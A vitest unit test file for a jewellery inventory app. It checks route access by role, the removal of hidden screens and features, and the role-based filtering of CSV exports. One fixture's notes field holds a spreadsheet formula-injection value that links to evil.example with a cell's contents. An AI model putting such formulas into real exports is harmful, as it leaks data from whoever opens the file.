import { readFileSync, readdirSync, statSync } from 'node:fs';
import path from 'node:path';
import React from 'react';
import { renderToStaticMarkup } from 'react-dom/server';
import ts from 'typescript';
import { describe, expect, it } from 'vitest';
import DesignTabs from '@/app/design-detail/components/DesignTabs';
import ReportsClient from '@/app/reports/components/ReportsClient';
import { canAccessPath, type AuthRole } from '@/lib/authStore';
import { inventoryExportRows } from '@/lib/inventoryExport';
import type { Design, Sku } from '@/lib/mockData';

// T-E04 (unit half; spec C15, QA LED-09, O32; task WEB12b): in M1 these are not connected and not reachable: Order Book, the public catalogue and its admin screens, the sample Audit and Sales
// tabs, the Estimate screen's date editor and edit mode, and the Reports screen's date controls and export buttons; "Reset Defaults" and "Delete All Inventory" are gone. The browser half
// (the same URLs opened by the owner, a biller and a staff user, the screens drawn by the real build) is tests/e2e/hidden-and-download.spec.ts.

const root = path.resolve(__dirname, '../..');
const SRC = path.join(root, 'src');

function* walk(dir: string): Generator<string> {
  for (const name of readdirSync(dir).sort()) {
    const full = path.join(dir, name);
    if (statSync(full).isDirectory()) yield* walk(full);
    else yield full;
  }
}
const sourceFiles = () => [...walk(SRC)].filter((f) => /\.(ts|tsx)$/.test(f));
const rel = (f: string) => path.relative(SRC, f).split(path.sep).join('/');

/** The string literals of a file (comments do not count). */
function strings(file: string): string[] {
  const text = readFileSync(file, 'utf8');
  const sf = ts.createSourceFile(
    file,
    text,
    ts.ScriptTarget.Latest,
    true,
    file.endsWith('x') ? ts.ScriptKind.TSX : ts.ScriptKind.TS
  );
  const out: string[] = [];
  const visit = (node: ts.Node) => {
    if (ts.isStringLiteralLike(node)) out.push(node.text);
    else if (ts.isJsxText(node)) out.push(node.text);
    else if (ts.isTemplateExpression(node))
      out.push(node.head.text, ...node.templateSpans.map((s) => s.literal.text));
    ts.forEachChild(node, visit);
  };
  visit(sf);
  return out;
}

const HIDDEN = ['/order-book', '/catalogue', '/customer-catalogue'];
const ROLES: AuthRole[] = ['owner', 'biller', 'staff'];

describe('T-E04 the hidden screens cannot be reached by URL', () => {
  it.each(HIDDEN.flatMap((route) => ROLES.map((role) => [route, role] as const)))(
    '%s is closed to %s, and a sub-path or a query does not open it',
    (route, role) => {
      expect(canAccessPath(role, route)).toBe(false);
      expect(canAccessPath(role, `${route}/`)).toBe(false);
      expect(canAccessPath(role, `${route}?id=1`)).toBe(false);
      expect(canAccessPath(role, `${route}/anything`)).toBe(false);
    }
  );

  it('every page of the application is drawn inside the one gate (AppLayout): a page that left it out would show its screen to anybody, signed in or not', () => {
    const pages = sourceFiles().filter((f) =>
      /\/app\/(.*\/)?page\.tsx$/.test(f.split(path.sep).join('/'))
    );
    expect(pages.length).toBeGreaterThan(10);
    const outside = pages.filter((f) => !/<AppLayout[\s>]/.test(readFileSync(f, 'utf8'))).map(rel);
    expect(outside).toEqual([]);
  });

  it('nothing in the menus, the buttons or the links of the application leads to a hidden screen: the only mentions are inside the hidden screens themselves', () => {
    const mentions: string[] = [];
    for (const file of sourceFiles()) {
      const name = rel(file);
      if (/^app\/(order-book|catalogue|customer-catalogue)\//.test(name)) continue;
      for (const s of strings(file)) {
        if (
          HIDDEN.some(
            (route) => s === route || s.startsWith(`${route}/`) || s.startsWith(`${route}?`)
          )
        )
          mentions.push(`${name}: ${s}`);
      }
    }
    expect(mentions).toEqual([]);
  });
});

describe('T-E04 the sample Audit and Sales tabs of the design page are gone', () => {
  it('the design page offers its pieces and nothing else: no "Sales History", no "Audit Log", no sample SET-00572 tab', () => {
    const html = renderToStaticMarkup(React.createElement(DesignTabs));
    expect(html).toContain('SKUs');
    expect(html).not.toMatch(/Sales History|Audit/i);
    expect(html).not.toContain('SET-00572');
  });

  it('their files are gone, so nothing can bring them back by an import', () => {
    const names = sourceFiles().map(rel);
    expect(names).not.toContain('app/design-detail/components/DesignAuditLog.tsx');
    expect(names).not.toContain('app/design-detail/components/DesignSalesHistory.tsx');
  });
});

describe('T-E04 the Reports screen has no date controls and no export buttons (C15, O32)', () => {
  const html = renderToStaticMarkup(React.createElement(ReportsClient));

  it('draws no date field and no Excel, CSV or PDF button, and says nothing of exports', () => {
    expect(html).not.toMatch(/type="date"/);
    expect(html).not.toMatch(/>\s*(Excel|CSV|PDF)\s*</);
    expect(html).not.toMatch(/data exports|Export/i);
    expect(html).toContain('Reports');
  });

  it('still has its four tabs (the screen is rewired to the selectors by WEB12, not hidden: the cut line O32 is not used)', () => {
    for (const label of ['Inventory', 'Sales', 'Payments', 'Jewellery Metrics'])
      expect(html).toContain(label);
  });

  it('imports nothing from the export code, and carries no fixed date range of the prototype', () => {
    const source = readFileSync(path.join(SRC, 'app/reports/components/ReportsClient.tsx'), 'utf8');
    expect(source).not.toMatch(/exportUtils|downloadCsv|downloadExcel|printPdf/);
    expect(source).not.toMatch(/2026-08-/);
  });
});

describe('T-E04 the Estimate screen has no date editor and no edit mode', () => {
  it('no date field, no Edit button, no call that rewrites a bill or its date', () => {
    for (const file of [...walk(path.join(SRC, 'app/estimate'))]) {
      const text = readFileSync(file, 'utf8');
      expect(text, rel(file)).not.toMatch(/type="date"|type=\{'date'\}/);
      expect(text, rel(file)).not.toMatch(/updateInvoice|updateInvoiceDate/);
      expect(
        strings(file).some((s) => /^(Edit|Edit Estimate|Edit Mode)$/.test(s.trim())),
        rel(file)
      ).toBe(false);
    }
  });
});

describe('T-E04 "Reset Defaults" and "Delete All Inventory" are gone', () => {
  it('no screen, store or label of the application has them', () => {
    const found: string[] = [];
    for (const file of sourceFiles()) {
      for (const s of strings(file))
        if (/Reset Defaults|Delete All Inventory|Delete ALL inventory/i.test(s))
          found.push(`${rel(file)}: ${s}`);
    }
    expect(found).toEqual([]);
  });

  it('the two functions behind them do not exist any more: clearInventory and resetSettings', () => {
    const designStore = readFileSync(path.join(SRC, 'lib/designStore.ts'), 'utf8');
    const settingsStore = readFileSync(path.join(SRC, 'lib/settingsStore.ts'), 'utf8');
    expect(designStore).not.toMatch(/function clearInventory/);
    expect(settingsStore).not.toMatch(/function resetSettings/);
  });
});

describe('T-D03 (clause) no CSV export for a biller or staff holds the original weight', () => {
  // the owner's original weight of a piece is a value no other column of the export can equal
  const ORIGINAL = 34.987;
  const sku = (n: number, original: number): Sku => ({
    id: `sku-${n}`,
    skuNumber: `RING-00001-00${n}`,
    designId: 'design-1',
    designNumber: 'RING-00001',
    grossWeight: 12.5,
    originalNetWeight: original,
    customerNetWeight: 11.25,
    stones: 3,
    stoneWeight: 0.5,
    kundan: 2,
    kundanWeight: 0.25,
    piroi: 150,
    labour: 353,
    retailLabour: 353,
    semiWholesaleLabour: 325,
    wholesaleLabour: 300,
    status: 'In Stock',
    location: 'Main Showroom',
    barcode: `BC${n}`,
    createdAt: '2026-10-15T09:00:00.000Z',
    createdBy: 'Asha',
    notes: n === 2 ? '=HYPERLINK("http://evil.example/?"&A1,"click")' : '',
    sellingMethod: 'By Weight',
    purity: '22K',
    material: 'Gold',
    category: 'Ring',
    subcategory: 'Plain',
  });
  const designs: Design[] = [
    {
      id: 'design-1',
      designNumber: 'RING-00001',
      designName: 'Plain ring',
      category: 'Ring',
      subcategory: 'Plain',
      material: 'Gold',
      purity: '22K',
      sellingMethod: 'By Weight',
      description: '',
      notes: '',
      tags: [],
      images: [],
      primaryImage: '/assets/images/no_image.png',
      skus: [sku(1, ORIGINAL), sku(2, 8.001)],
      createdAt: '2026-10-15T09:00:00.000Z',
      createdBy: 'Asha',
      labour: 353,
      piroi: 150,
    },
  ];

  it('the inventory screen builds its rows with that function and keeps no copy of the column of its own', () => {
    const header = readFileSync(
      path.join(SRC, 'app/inventory-management/components/InventoryHeader.tsx'),
      'utf8'
    );
    expect(header).toContain('inventoryExportRows(getDesigns(), role)');
    expect(header).not.toContain('originalNetWeight');
  });

  it("the owner's inventory export has the column, with the weight of every piece", () => {
    const rows = inventoryExportRows(designs, 'owner');
    expect(rows).toHaveLength(2);
    expect(Object.keys(rows[0])).toContain('Original Net Weight (g)');
    expect(rows.map((r) => r['Original Net Weight (g)'])).toEqual([ORIGINAL, 8.001]);
  });

  it.each(['biller', 'staff', null] as const)(
    'for %s the export has no such column, and no cell carries either weight',
    (role) => {
      const rows = inventoryExportRows(designs, role);
      expect(rows).toHaveLength(2);
      for (const row of rows) {
        expect(Object.keys(row).filter((k) => /original/i.test(k))).toEqual([]);
        expect(Object.values(row)).not.toContain(ORIGINAL);
        expect(Object.values(row)).not.toContain(8.001);
      }
      // the customer's weight stays: it is on the tag
      expect(Object.keys(rows[0])).toContain('Customer Net Weight (g)');
      expect(rows[0]['Customer Net Weight (g)']).toBe(11.25);
    }
  );
});
